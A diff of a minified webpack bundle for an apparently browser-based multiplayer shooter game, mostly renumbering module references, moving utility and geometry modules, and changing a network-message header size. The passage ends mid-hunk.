@@ -42,12 +42,12 @@
         return i.d(e, "a", e), e
     }, i.o = function(t, e) {
         return Object.prototype.hasOwnProperty.call(t, e)
-    }, i.p = "", i(i.s = 61)
+    }, i.p = "", i(i.s = 56)
 }([function(t, e, i) {
     var n = e.global = i(26),
         r = e.hasBuffer = n && !!n.isBuffer,
         s = e.hasArrayBuffer = "undefined" != typeof ArrayBuffer,
-        o = e.isArray = i(8);
+        o = e.isArray = i(9);
     e.isArrayBuffer = s ? function(t) {
         return t instanceof ArrayBuffer || f(t)
     } : g;
@@ -74,7 +74,7 @@
     var l = e.Array = i(29),
         p = e.Buffer = i(30),
         h = e.Uint8Array = i(31),
-        u = e.prototype = i(9);
+        u = e.prototype = i(10);
 
     function d(t) {
         return m(this).alloc(t)
@@ -97,7 +97,7 @@
     }
 }, function(t, e, i) {
     (function(e) {
-        t.exports.isProd = void 0 !== e && !!e.env.IS_PROD || "undefined" != typeof location && "127.0.0.1" !== location.hostname && "localhost" !== location.hostname && !location.hostname.startsWith("192.168."), t.exports.enableHttps = t.exports.isProd, t.exports.serverTickRate = 1e3 / 30, t.exports.serverSendRate = 100, t.exports.clientSendRate = 1e3 / 30, t.exports.dltMx = Math.round(1e3 / 30), t.exports.streamUpdate = 1e4, t.exports.fpsFOV = 70, t.exports.maxPlayers = 8, t.exports.serverSpread = 3, t.exports.minServerSpace = 3, t.exports.gamesPerServer = 5, t.exports.serverBrowserRate = 1e4, t.exports.maxPlayersTotal = t.exports.maxPlayers * t.exports.gamesPerServer + 50, t.exports.kickTimer = 9e4, t.exports.endTimer = 2e4, t.exports.endAnim = 5e3, t.exports.thirdPZ = 14, t.exports.thirdPX = 5, t.exports.serverConfig = [{
+        t.exports.isProd = void 0 !== e && !!e.env.IS_PROD || "undefined" != typeof location && "127.0.0.1" !== location.hostname && "localhost" !== location.hostname && !location.hostname.startsWith("192.168."), t.exports.enableHttps = t.exports.isProd, t.exports.serverTickRate = 1e3 / 30, t.exports.serverSendRate = 100, t.exports.clientSendRate = 1e3 / 30, t.exports.dltMx = Math.round(1e3 / 30), t.exports.streamUpdate = 1e4, t.exports.maxPlayers = 8, t.exports.serverSpread = 3, t.exports.minServerSpace = 3, t.exports.gamesPerServer = 5, t.exports.serverBrowserRate = 1e4, t.exports.maxPlayersTotal = t.exports.maxPlayers * t.exports.gamesPerServer + 50, t.exports.kickTimer = 9e4, t.exports.endTimer = 2e4, t.exports.endAnim = 5e3, t.exports.thirdPZ = 14, t.exports.thirdPX = 5, t.exports.serverConfig = [{
             name: "Players",
             varN: "maxPlayers",
             def: 2,
@@ -254,7 +254,7 @@
             "us-fl": "Miami",
             sgp: "Singapore"
         }
-    }).call(this, i(23))
+    }).call(this, i(22))
 }, function(t, e, i) {
     "use strict";
 
@@ -15703,7 +15703,7 @@
         console.error("THREE.LensFlare has been moved to /examples/js/objects/Lensflare.js")
     }
 }, function(t, e, i) {
-    var n = i(8);
+    var n = i(9);
     e.createCodec = a, e.install = function(t) {
         for (var e in t) s.prototype[e] = o(s.prototype[e], t[e])
     }, e.filter = function(t) {
@@ -15738,6 +15738,89 @@
     }, e.preset = a({
         preset: !0
     })
+}, function(t, e, i) {
+    "use strict";
+    var n = i(50),
+        r = i(63),
+        s = Object.prototype.toString;
+
+    function o(t) {
+        return "[object Array]" === s.call(t)
+    }
+
+    function a(t) {
+        return null !== t && "object" == typeof t
+    }
+
+    function c(t) {
+        return "[object Function]" === s.call(t)
+    }
+
+    function l(t, e) {
+        if (null != t)
+            if ("object" != typeof t && (t = [t]), o(t))
+                for (var i = 0, n = t.length; i < n; i++) e.call(null, t[i], i, t);
+            else
+                for (var r in t) Object.prototype.hasOwnProperty.call(t, r) && e.call(null, t[r], r, t)
+    }
+    t.exports = {
+        isArray: o,
+        isArrayBuffer: function(t) {
+            return "[object ArrayBuffer]" === s.call(t)
+        },
+        isBuffer: r,
+        isFormData: function(t) {
+            return "undefined" != typeof FormData && t instanceof FormData
+        },
+        isArrayBufferView: function(t) {
+            return "undefined" != typeof ArrayBuffer && ArrayBuffer.isView ? ArrayBuffer.isView(t) : t && t.buffer && t.buffer instanceof ArrayBuffer
+        },
+        isString: function(t) {
+            return "string" == typeof t
+        },
+        isNumber: function(t) {
+            return "number" == typeof t
+        },
+        isObject: a,
+        isUndefined: function(t) {
+            return void 0 === t
+        },
+        isDate: function(t) {
+            return "[object Date]" === s.call(t)
+        },
+        isFile: function(t) {
+            return "[object File]" === s.call(t)
+        },
+        isBlob: function(t) {
+            return "[object Blob]" === s.call(t)
+        },
+        isFunction: c,
+        isStream: function(t) {
+            return a(t) && c(t.pipe)
+        },
+        isURLSearchParams: function(t) {
+            return "undefined" != typeof URLSearchParams && t instanceof URLSearchParams
+        },
+        isStandardBrowserEnv: function() {
+            return ("undefined" == typeof navigator || "ReactNative" !== navigator.product) && "undefined" != typeof window && "undefined" != typeof document
+        },
+        forEach: l,
+        merge: function t() {
+            function e(e, n) {
+                i[n] = "object" == typeof i[n] && "object" == typeof e ? t(i[n], e) : e
+            }
+            for (var i = {}, n = 0, r = arguments.length; n < r; n++) l(arguments[n], e);
+            return i
+        },
+        extend: function(t, e, i) {
+            return l(e, function(e, r) {
+                t[r] = i && "function" == typeof e ? n(e, i) : e
+            }), t
+        },
+        trim: function(t) {
+            return t.replace(/^\s*/, "").replace(/\s*$/, "")
+        }
+    }
 }, function(t, e, i) {
     const n = i(1);
     t.exports.keyboardMap = ["", "", "", "CANCEL", "", "", "HELP", "", "BACK_SPACE", "TAB", "", "", "CLEAR", "ENTER", "ENTER_SPECIAL", "", "SHIFT", "CONTROL", "ALT", "PAUSE", "CAPS_LOCK", "KANA", "EISU", "JUNJA", "FINAL", "HANJA", "", "ESCAPE", "CONVERT", "NONCONVERT", "ACCEPT", "MODECHANGE", "SPACE", "PAGE_UP", "PAGE_DOWN", "END", "HOME", "LEFT", "UP", "RIGHT", "DOWN", "SELECT", "PRINT", "EXECUTE", "PRINTSCREEN", "INSERT", "DELETE", "", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "COLON", "SEMICOLON", "LESS_THAN", "EQUALS", "GREATER_THAN", "QUESTION_MARK", "AT", "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z", "OS_KEY", "", "CONTEXT_MENU", "", "SLEEP", "NUMPAD0", "NUMPAD1", "NUMPAD2", "NUMPAD3", "NUMPAD4", "NUMPAD5", "NUMPAD6", "NUMPAD7", "NUMPAD8", "NUMPAD9", "MULTIPLY", "ADD", "SEPARATOR", "SUBTRACT", "DECIMAL", "DIVIDE", "F1", "F2", "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10", "F11", "F12", "F13", "F14", "F15", "F16", "F17", "F18", "F19", "F20", "F21", "F22", "F23", "F24", "", "", "", "", "", "", "", "", "NUM_LOCK", "SCROLL_LOCK", "WIN_OEM_FJ_JISHO", "WIN_OEM_FJ_MASSHOU", "WIN_OEM_FJ_TOUROKU", "WIN_OEM_FJ_LOYA", "WIN_OEM_FJ_ROYA", "", "", "", "", "", "", "", "", "", "CIRCUMFLEX", "EXCLAMATION", "DOUBLE_QUOTE", "HASH", "DOLLAR", "PERCENT", "AMPERSAND", "UNDERSCORE", "OPEN_PAREN", "CLOSE_PAREN", "ASTERISK", "PLUS", "PIPE", "HYPHEN_MINUS", "OPEN_CURLY_BRACKET", "CLOSE_CURLY_BRACKET", "TILDE", "", "", "", "", "VOLUME_MUTE", "VOLUME_DOWN", "VOLUME_UP", "", "", "SEMICOLON", "EQUALS", "COMMA", "MINUS", "PERIOD", "SLASH", "BACK_QUOTE", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "OPEN_BRACKET", "BACK_SLASH", "CLOSE_BRACKET", "QUOTE", "", "META", "ALTGR", "", "WIN_ICO_HELP", "WIN_ICO_00", "", "WIN_ICO_CLEAR", "", "", "WIN_OEM_RESET", "WIN_OEM_JUMP", "WIN_OEM_PA1", "WIN_OEM_PA2", "WIN_OEM_PA3", "WIN_OEM_WSCTRL", "WIN_OEM_CUSEL", "WIN_OEM_ATTN", "WIN_OEM_FINISH", "WIN_OEM_COPY", "WIN_OEM_AUTO", "WIN_OEM_ENLW", "WIN_OEM_BACKTAB", "ATTN", "CRSEL", "EXSEL", "EREOF", "PLAY", "ZOOM", "", "PA1", "WIN_OEM_CLEAR", ""], t.exports.getB64Size = function() {}, Number.prototype.round = function(t) {
@@ -15993,12 +16076,12 @@
     var s = i(25);
     t.exports.encodeNetworkMessage = function(e, i) {
         let n = s.encode(e),
-            r = new Uint8Array(n.length + 3);
-        return r.set(t.exports.encodeShort(i), 0), r.set(n, 3), r
+            r = new Uint8Array(n.length + 2);
+        return r.set(t.exports.encodeShort(i), 0), r.set(n, 2), r
     }, t.exports.decodeNetworkMessage = function(e) {
         e = new Uint8Array(e);
         let i = t.exports.decodeShort(e[0], e[1]),
-            n = e.slice(3);
+            n = e.slice(2);
         return [s.decode(n), i]
     }, t.exports.rotateNumber = function(t, e) {
         return 255 & t + e
@@ -16008,7 +16091,7 @@
         return (t << 4) + e
     }
 }, function(t, e, i) {
-    var n = i(6).ExtBuffer,
+    var n = i(7).ExtBuffer,
         r = i(33),
         s = i(34),
         o = i(3);
@@ -16249,7 +16332,7 @@
         }("string" != typeof e.nodeName ? e : this || {})
     }).call(this, i(15).Buffer)
 }, function(t, e, i) {
-    var n = i(6).ExtBuffer,
+    var n = i(7).ExtBuffer,
         r = i(36),
         s = i(20).readUint8,
         o = i(37),
@@ -16279,89 +16362,6 @@
         init: c
     }), e.preset = c.call(a.preset)
 }, function(t, e, i) {
-    "use strict";
-    var n = i(56),
-        r = i(68),
-        s = Object.prototype.toString;
-
-    function o(t) {
-        return "[object Array]" === s.call(t)
-    }
-
-    function a(t) {
-        return null !== t && "object" == typeof t
-    }
-
-    function c(t) {
-        return "[object Function]" === s.call(t)
-    }
-
-    function l(t, e) {
-        if (null != t)
-            if ("object" != typeof t && (t = [t]), o(t))
-                for (var i = 0, n = t.length; i < n; i++) e.call(null, t[i], i, t);
-            else
-                for (var r in t) Object.prototype.hasOwnProperty.call(t, r) && e.call(null, t[r], r, t)
-    }
-    t.exports = {
-        isArray: o,
-        isArrayBuffer: function(t) {
-            return "[object ArrayBuffer]" === s.call(t)
-        },
-        isBuffer: r,
-        isFormData: function(t) {
-            return "undefined" != typeof FormData && t instanceof FormData
-        },
-        isArrayBufferView: function(t) {
-            return "undefined" != typeof ArrayBuffer && ArrayBuffer.isView ? ArrayBuffer.isView(t) : t && t.buffer && t.buffer instanceof ArrayBuffer
-        },
-        isString: function(t) {
-            return "string" == typeof t
-        },
-        isNumber: function(t) {
-            return "number" == typeof t
-        },
-        isObject: a,
-        isUndefined: function(t) {
-            return void 0 === t
-        },
-        isDate: function(t) {
-            return "[object Date]" === s.call(t)
-        },
-        isFile: function(t) {
-            return "[object File]" === s.call(t)
-        },
-        isBlob: function(t) {
-            return "[object Blob]" === s.call(t)
-        },
-        isFunction: c,
-        isStream: function(t) {
-            return a(t) && c(t.pipe)
-        },
-        isURLSearchParams: function(t) {
-            return "undefined" != typeof URLSearchParams && t instanceof URLSearchParams
-        },
-        isStandardBrowserEnv: function() {
-            return ("undefined" == typeof navigator || "ReactNative" !== navigator.product) && "undefined" != typeof window && "undefined" != typeof document
-        },
-        forEach: l,
-        merge: function t() {
-            function e(e, n) {
-                i[n] = "object" == typeof i[n] && "object" == typeof e ? t(i[n], e) : e
-            }
-            for (var i = {}, n = 0, r = arguments.length; n < r; n++) l(arguments[n], e);
-            return i
-        },
-        extend: function(t, e, i) {
-            return l(e, function(e, r) {
-                t[r] = i && "function" == typeof e ? n(e, i) : e
-            }), t
-        },
-        trim: function(t) {
-            return t.replace(/^\s*/, "").replace(/\s*$/, "")
-        }
-    }
-}, function(t, e, i) {
     e.encode = function(t, e) {
         var i = new n(e);
         return i.write(t), i.read()
@@ -16369,7 +16369,7 @@
     var n = i(14).EncodeBuffer
 }, function(t, e, i) {
     e.EncodeBuffer = r;
-    var n = i(5).preset;
+    var n = i(6).preset;
 
     function r(t) {
         if (!(this instanceof r)) return new r(t);
@@ -16391,7 +16391,7 @@
          * @license  MIT
          */
         var n = i(27),
-            r = i(7),
+            r = i(8),
             s = i(28);
 
         function o() {
@@ -17048,7 +17048,7 @@
             for (var r = 0; r < n && !(r + i >= e.length || r >= t.length); ++r) e[r + i] = t[r];
             return r
         }
-    }).call(this, i(24))
+    }).call(this, i(23))
 }, function(t, e) {
     for (var i = e.uint8 = Array(256), n = 0; 255 >= n; n++) i[n] = r(n);
 
@@ -17184,7 +17184,7 @@
     var n = i(19).DecodeBuffer
 }, function(t, e, i) {
     e.DecodeBuffer = r;
-    var n = i(11).preset;
+    var n = i(12).preset;
 
     function r(t) {
         if (!(this instanceof r)) return new r(t);
@@ -17197,8 +17197,8 @@
         return this.codec.decode(this)
     }
 }, function(t, e, i) {
-    var n = i(7),
-        r = i(10),
+    var n = i(8),
+        r = i(11),
         s = r.Uint64BE,
         o = r.Int64BE;
     e.getReadFormat = function(t) {
@@ -17223,7 +17223,7 @@
         }
     }, e.readUint8 = y;
     var a = i(0),
-        c = i(9),
+        c = i(10),
         l = "undefined" != typeof Map,
         p = !0;
 
@@ -17432,77 +17432,6 @@
         function t() {
             if (!(this instanceof t)) return new t
         })
-}, function(t, e, i) {
-    var n = i(2);
-    const r = i(1);
-    i(4);
-    var s = {};
-    t.exports.getColor = function(t, e) {
-        var i = t + "-" + (e || ""),
-            r = s[i];
-        return r || (r = new n.Color(t), e && r.multiplyScalar(e), s[i] = r), r
-    }, t.exports.colorize = function(e, i, n) {
-        i = n || t.exports.getColor(i);
-        for (var r = 0; r < e.faces.length; ++r) e.faces[r].vertexColors[0] = i, e.faces[r].vertexColors[1] = i, e.faces[r].vertexColors[2] = i
-    };
-    var o, a = function(t, e, i, r) {
-            for (var s, o = new n.Vector2(e, i).multiplyScalar(r || 1), a = 0; a < t.faceVertexUvs.length; a++) {
-                s = t.faceVertexUvs[a];
-                for (var c = 0; c < s.length; c++)
-                    for (var l, p = 0; 3 > p; p++)(l = s[c][p].multiply(o)).x = .5 + l.x - o.x / 2
-            }
-        },
-        c = function(t, e, i, n, r, s) {
-            return t >= i - r && t <= i + r && e >= n - s && e <= n + s
-        },
-        l = [],
-        p = ["a", "b", "c", "d"];
-    t.exports.generatePlane = function(e, i, s, h, u, d) {
-        e *= s.ratio || 1;
-        var f = (s.scale ? e + "_" + i + "_" : "") + (s.scale || "") + (s.tilesX || "") + (s.tilesZ || "") + (s.noise ? h + "_" + u + "_" + d : "") + (null == s.colr ? "" : s.colr);
-        if (!(o = l[f])) {
-            if (o = new n.PlaneGeometry(1, 1, s.tilesX || 1, s.tilesZ || 1), s.noise) {
-                for (var m = {}, g = s.margin || 0, v = 0; v < o.vertices.length; ++v) {
-                    var y = o.vertices[v].x,
-                        x = o.vertices[v].y;
-                    if (!s.pinEdges || -.5 != y && .5 != y && -.5 != x && .5 != x)
-                        if (s.objects) {
-                            for (var w = 0; w < s.objects.length; ++w)
-                                if (s.objects[w].y - s.objects[w].height <= u + .1 && s.objects[w].y + s.objects[w].height > u + s.noise && c(d + -x * e * 2, h + y * i * 2, s.objects[w].z, s.objects[w].x, s.objects[w].length + g, s.objects[w].width + g)) {
-                                    o.vertices[v].z = Math.random() * s.noise + 1, m[v] = t.exports.getColor(s.colr, .65);
-                                    break
-                                }
-                        } else o.vertices[v].z = Math.random() * s.noise;
-                    m[v] || (m[v] = t.exports.getColor(s.colr))
-                }
-                for (v = 0; v < o.faces.length; v++) {
-                    for (var b = o.faces[v], M = 0, _ = 0; 3 > _; _++) b.vertexColors[_] = m[b[p[_]]], 0 >= o.vertices[b[p[_]]].z && M++;
-                    3 <= M && delete o.faces[v]
-                }
-                o.faces = o.faces.filter(function(t) {
-                    return t
-                }), o.elementsNeedUpdate = !0
-            } else s.colr && t.exports.colorize(o, s.colr);
-            s.scale && a(o, i / r.worldUV, e / r.worldUV, s.scale), o.computeVertexNormals(), l[f] = o
-        }
-        return o
-    };
-    var h = [];
-    t.exports.generateCube = function(e, i, s, c, l) {
-        e = e || [1, 1, 1, 1, 1, 1], l.flipp = (i > s || c > s) && "floor_0" == l.src, l.flippW = i > c && "floor_0" == l.src;
-        for (var p = (l.scale ? i + "_" + s + "_" + c + "_" : "") + (null == l.colr ? "" : l.colr) + (l.scale || "") + (l.flippW ? "flw" : "fnw") + (l.flipp ? "fl" : "fn") + (l.amb || "") + (l.useScale || ""), u = 0; u < e.length; ++u) p += "_" + e[u];
-        if (!(o = h[p])) {
-            l.colr = null == l.colr ? 16777215 : l.colr;
-            var d = t.exports.getColor(l.colr),
-                f = d;
-            o = new n.Geometry;
-            var m, g = [];
-            e[0] && ((m = new n.PlaneGeometry(1, 1)).rotateY(Math.PI / 2), l.flipp && m.rotateX(Math.PI / 2), m.translate(.5, .5, 0), m.faces[0].vertexColors = [d, f, d], m.faces[1].vertexColors = [f, f, d], l.scale && a(m, (l.flipp ? s : c) / r.worldUV, (l.flipp ? c : s) / r.worldUV, l.scale), g.push(m)), e[1] && ((m = new n.PlaneGeometry(1, 1)).rotateY(-Math.PI / 2), l.flipp && m.rotateX(Math.PI / 2), m.translate(-.5, .5, 0), m.faces[0].vertexColors = [d, f, d], m.faces[1].vertexColors = [f, f, d], l.scale && a(m, (l.flipp ? s : c) / r.worldUV, (l.flipp ? c : s) / r.worldUV, l.scale), g.push(m)), e[2] && ((m = new n.PlaneGeometry(1, 1)).rotateX(-Math.PI / 2), l.flippW && m.rotateY(Math.PI / 2), m.translate(0, 1, 0), m.faces[0].vertexColors = [d, d, d], m.faces[1].vertexColors = [d, d, d], l.scale && a(m, (l.flippW ? c : i) / r.worldUV, (l.flippW ? i : c) / r.worldUV, l.scale), g.push(m)), e[3] && ((m = new n.PlaneGeometry(1, 1)).rotateX(Math.PI / 2), l.flippW && m.rotateY(Math.PI / 2), m.translate(0, 0, 0), m.faces[0].vertexColors = [f, f, f], m.faces[1].vertexColors = [f, f, f], l.scale && a(m, (l.flippW ? c : i) / r.worldUV, (l.flippW ? i : c) / r.worldUV, l.scale), g.push(m)), e[4] && (m = new n.PlaneGeometry(1, 1), l.flipp && m.rotateZ(Math.PI / 2), m.translate(0, .5, .5), m.faces[0].vertexColors = [d, f, d], m.faces[1].vertexColors = [f, f, d], l.scale && a(m, (l.flipp ? s : i) / r.worldUV, (l.flipp ? i : s) / r.worldUV, l.scale), g.push(m)), e[5] && ((m = new n.PlaneGeometry(1, 1)).rotateY(Math.PI), l.flipp && m.rotateZ(Math.PI / 2), m.translate(0, .5, -.5), m.faces[0].vertexColors = [d, f, d], m.faces[1].vertexColors = [f, f, d], l.scale && a(m, (l.flipp ? s : i) / r.worldUV, (l.flipp ? i : s) / r.worldUV, l.scale), g.push(m));
-            for (u = 0; u < g.length; u++) o.merge(g[u], new n.Matrix4);
-            l && l.useScale && (o.scale(i, s, c), o.translate(0, -s / 2, 0)), h[p] = o
-        }
-        return o
-    }
 }, function(t, e) {
     var i, n, r = t.exports = {};
 
@@ -17604,6 +17533,77 @@
         "object" == typeof window && (i = window)
     }
     t.exports = i
+}, function(t, e, i) {
+    var n = i(2);
+    const r = i(1);
+    i(5);
+    var s = {};
+    t.exports.getColor = function(t, e) {
+        var i = t + "-" + (e || ""),
+            r = s[i];
+        return r || (r = new n.Color(t), e && r.multiplyScalar(e), s[i] = r), r
+    }, t.exports.colorize = function(e, i, n) {
+        i = n || t.exports.getColor(i);
+        for (var r = 0; r < e.faces.length; ++r) e.faces[r].vertexColors[0] = i, e.faces[r].vertexColors[1] = i, e.faces[r].vertexColors[2] = i
+    };
+    var o, a = function(t, e, i, r) {
+            for (var s, o = new n.Vector2(e, i).multiplyScalar(r || 1), a = 0; a < t.faceVertexUvs.length; a++) {
+                s = t.faceVertexUvs[a];
+                for (var c = 0; c < s.length; c++)
+                    for (var l, p = 0; 3 > p; p++)(l = s[c][p].multiply(o)).x = .5 + l.x - o.x / 2
+            }
+        },
+        c = function(t, e, i, n, r, s) {
+            return t >= i - r && t <= i + r && e >= n - s && e <= n + s
+        },
+        l = [],
+        p = ["a", "b", "c", "d"];
+    t.exports.generatePlane = function(e, i, s, h, u, d) {
+        e *= s.ratio || 1;
+        var f = (s.scale ? e + "_" + i + "_" : "") + (s.scale || "") + (s.tilesX || "") + (s.tilesZ || "") + (s.noise ? h + "_" + u + "_" + d : "") + (null == s.colr ? "" : s.colr);
+        if (!(o = l[f])) {
+            if (o = new n.PlaneGeometry(1, 1, s.tilesX || 1, s.tilesZ || 1), s.noise) {
+                for (var m = {}, g = s.margin || 0, v = 0; v < o.vertices.length; ++v) {
+                    var y = o.vertices[v].x,
+                        x = o.vertices[v].y;
+                    if (!s.pinEdges || -.5 != y && .5 != y && -.5 != x && .5 != x)
+                        if (s.objects) {
+                            for (var w = 0; w < s.objects.length; ++w)
+                                if (s.objects[w].y - s.objects[w].height <= u + .1 && s.objects[w].y + s.objects[w].height > u + s.noise && c(d + -x * e * 2, h + y * i * 2, s.objects[w].z, s.objects[w].x, s.objects[w].length + g, s.objects[w].width + g)) {
+                                    o.vertices[v].z = Math.random() * s.noise + 1, m[v] = t.exports.getColor(s.colr, .65);
+                                    break
+                                }
+                        } else o.vertices[v].z = Math.random() * s.noise;
+                    m[v] || (m[v] = t.exports.getColor(s.colr))
+                }
+                for (v = 0; v < o.faces.length; v++) {
+                    for (var b = o.faces[v], M = 0, _ = 0; 3 > _; _++) b.vertexColors[_] = m[b[p[_]]], 0 >= o.vertices[b[p[_]]].z && M++;
+                    3 <= M && delete o.faces[v]
+                }
+                o.faces = o.faces.filter(function(t) {
+                    return t
+                }), o.elementsNeedUpdate = !0
+            } else s.colr && t.exports.colorize(o, s.colr);
+            s.scale && a(o, i / r.worldUV, e / r.worldUV, s.scale), o.computeVertexNormals(), l[f] = o
+        }
+        return o
+    };
+    var h = [];
+    t.exports.generateCube = function(e, i, s, c, l) {
+        e = e || [1, 1, 1, 1, 1, 1], l.flipp = (i > s || c > s) && "floor_0" == l.src, l.flippW = i > c && "floor_0" == l.src;
+        for (var p = (l.scale ? i + "_" + s + "_" + c + "_" : "") + (null == l.colr ? "" : l.colr) + (l.scale || "") + (l.flippW ? "flw" : "fnw") + (l.flipp ? "fl" : "fn") + (l.amb || "") + (l.useScale || ""), u = 0; u < e.length; ++u) p += "_" + e[u];
+        if (!(o = h[p])) {
+            l.colr = null == l.colr ? 16777215 : l.colr;
+            var d = t.exports.getColor(l.colr),
+                f = d;
+            o = new n.Geometry;
+            var m, g = [];
+            e[0] && ((m = new n.PlaneGeometry(1, 1)).rotateY(Math.PI / 2), l.flipp && m.rotateX(Math.PI / 2), m.translate(.5, .5, 0), m.faces[0].vertexColors = [d, f, d], m.faces[1].vertexColors = [f, f, d], l.scale && a(m, (l.flipp ? s : c) / r.worldUV, (l.flipp ? c : s) / r.worldUV, l.scale), g.push(m)), e[1] && ((m = new n.PlaneGeometry(1, 1)).rotateY(-Math.PI / 2), l.flipp && m.rotateX(Math.PI / 2), m.translate(-.5, .5, 0), m.faces[0].vertexColors = [d, f, d], m.faces[1].vertexColors = [f, f, d], l.scale && a(m, (l.flipp ? s : c) / r.worldUV, (l.flipp ? c : s) / r.worldUV, l.scale), g.push(m)), e[2] && ((m = new n.PlaneGeometry(1, 1)).rotateX(-Math.PI / 2), l.flippW && m.rotateY(Math.PI / 2), m.translate(0, 1, 0), m.faces[0].vertexColors = [d, d, d], m.faces[1].vertexColors = [d, d, d], l.scale && a(m, (l.flippW ? c : i) / r.worldUV, (l.flippW ? i : c) / r.worldUV, l.scale), g.push(m)), e[3] && ((m = new n.PlaneGeometry(1, 1)).rotateX(Math.PI / 2), l.flippW && m.rotateY(Math.PI / 2), m.translate(0, 0, 0), m.faces[0].vertexColors = [f, f, f], m.faces[1].vertexColors = [f, f, f], l.scale && a(m, (l.flippW ? c : i) / r.worldUV, (l.flippW ? i : c) / r.worldUV, l.scale), g.push(m)), e[4] && (m = new n.PlaneGeometry(1, 1), l.flipp && m.rotateZ(Math.PI / 2), m.translate(0, .5, .5), m.faces[0].vertexColors = [d, f, d], m.faces[1].vertexColors = [f, f, d], l.scale && a(m, (l.flipp ? s : i) / r.worldUV, (l.flipp ? i : s) / r.worldUV, l.scale), g.push(m)), e[5] && ((m = new n.PlaneGeometry(1, 1)).rotateY(Math.PI), l.flipp && m.rotateZ(Math.PI / 2), m.translate(0, .5, -.5), m.faces[0].vertexColors = [d, f, d], m.faces[1].vertexColors = [f, f, d], l.scale && a(m, (l.flipp ? s : i) / r.worldUV, (l.flipp ? i : s) / r.worldUV, l.scale), g.push(m));
+            for (u = 0; u < g.length; u++) o.merge(g[u], new n.Matrix4);
+            l && l.useScale && (o.scale(i, s, c), o.translate(0, -s / 2, 0)), h[p] = o
+        }
+        return o
+    }
 }, function(t, e, i) {
     e.encode = i(13).encode, e.decode = i(18).decode, e.Encoder = i(38).Encoder, e.Decoder = i(39).Decoder, e.createCodec = i(40).createCodec, e.codec = i(41).codec
 }, function(t, e, i) {
@@ -17753,15 +17753,15 @@
         return e
     }
 }, function(t, e, i) {
-    var n = i(8),
-        r = i(10),
+    var n = i(9),
+        r = i(11),
         s = r.Uint64BE,
         o = r.Int64BE,
         a = i(0),
-        c = i(9),
+        c = i(10),
         l = i(35),
         p = i(16).uint8,
-        h = i(6).ExtBuffer,
+        h = i(7).ExtBuffer,
         u = "undefined" != typeof Uint8Array,
         d = "undefined" != typeof Map,
         f = [];
@@ -17869,8 +17869,8 @@
         }
     }
 }, function(t, e, i) {
-    var n = i(7),
-        r = i(10),
+    var n = i(8),
+        r = i(11),
         s = r.Uint64BE,
         o = r.Int64BE,
         a = i(16).uint8,
@@ -18047,9 +18047,9 @@
         this.decode(t), this.emit("end")
     }
 }, function(t, e, i) {
-    i(11), i(5), e.createCodec = i(3).createCodec
+    i(12), i(6), e.createCodec = i(3).createCodec
 }, function(t, e, i) {
-    i(11), i(5), e.codec = {
+    i(12), i(6), e.codec = {
         preset: i(3).preset
     }
 }, function(t, e, i) {
@@ -40240,7 +40240,7 @@
         for (var a = 0; a < s[o].objects.length; ++a) s[o].objects[a].id = n.prefabIDS[s[o].objects[a].id || 0], s[o].objects[a].t = n.textureIDS[s[o].objects[a].t || 0];
     t.exports.maps = s, t.exports.manager = function(t, e, n, o) {
         var a, c;
-        this.manager = new(i(46).manager)(t, n, o), this.maps = s, this.modes = r, this.spawns = [], this.lastGen = null, this.setMaps = function(t) {
+        this.manager = new(i(49).manager)(t, n, o), this.maps = s, this.modes = r, this.spawns = [], this.lastGen = null, this.setMaps = function(t) {
             this.maps = t || s
         }, this.getRandomMap = function() {
             return n.randInt(0, this.maps.length - 1)
@@ -40380,7 +40380,7 @@
 }, function(t, e, i) {
     let n = i(2);
     const r = i(1),
-        s = i(22);
+        s = i(24);
     let o = new n.TextureLoader;
 
     function a(t, e, i, r) {
@@ -40718,299 +40718,46 @@
         })
     }
 }, function(t, e, i) {
-    var n, r = i(1),
-        s = i(2);
-    t.exports = function(e, r, s) {
-        var o = i(22),
-            a = new e.LoadingManager,
-            c = new e.OBJLoader(a);
-        this.cubeGeo = new e.BoxGeometry(1, 1, 1), this.getCubeMesh = function() {
-            return new e.Mesh(this.cubeGeo)
-        };
-        var l = new e.PlaneGeometry(1, 1);
-        new e.CylinderGeometry(.1, 1, 1, 4, 1, !1, Math.PI / 4).computeFlatVertexNormals();
-        var p = new e.TextureLoader,
-            h = new e.MeshBasicMaterial({
-                color: 16777215
-            }),
-            u = new e.MeshBasicMaterial({
-                color: 65280
-            }),
-            d = {},
-            f = {},
-            m = {},
-            g = this,
-            v = {};
-        this.frustum = window.camhook = new e.Frustum;
-        var y = new e.Matrix4;
-        this.camera = window.camera = new e.PerspectiveCamera(0, window.innerWidth / window.innerHeight, .1, 8e3), this.fpsCamera = new e.PerspectiveCamera(s.fpsFOV, window.innerWidth / window.innerHeight, .1, 8e3), this.fpsCamera.layers.set(1), this.camera.add(this.fpsCamera), this.weaponLean = 1, this.init = function(i) {
-            this.scene = new e.Scene, t.exports.initScene.call(this, i), this.sunPlane = this.addPlane(0, 5e3, -4500, 750, 750, {
-                src: "sun_0",
-                noFog: !0,
-                transparent: !0,
-                mat: e.MeshBasicMaterial,
-                noGroup: !0
-            }, 0, r.getDirection(-4500, 5e3, 0, 0)), this.initShaders()
-        };
-        var x = 0;
-        this.flash = function(t, e) {
-            flashOverlay.style.display = "block", flashOverlay.style.left = 100 * t + "%", flashOverlay.style.top = 100 * (1 - e) + "%", x = 1
-        }, this.updateLightMap = function(t) {
-            this.skyLight && (this.skyLight.shadow.camera.right = t.shadWidth, this.skyLight.shadow.camera.left = -t.shadWidth, this.skyLight.shadow.camera.top = t.shadLength, this.skyLight.shadow.camera.bottom = -t.shadLength)
-        }, this.useDepthMap = 0, this.toggleDepthMap = function(i) {
-            if (this.useDepthMap = i, this.scene) {
-                var r = i && "0" != i;
-                this.scene.overrideMaterial = r ? h : null, r ? (this.scene.fog = new e.Fog(0, 0, i), this.renderer.setClearColor(0)) : t.exports.initScene.call(this, n)
-            }
-        }, this.greenScreen = !1, this.updateGreenScreen = function(t) {
-            g.greenScreen && !t.noGreen ? (t.realMat = t.material, t.material = u) : t.material = t.realMat || t.material
-        }, this.toggleGreenscreen = function(t) {
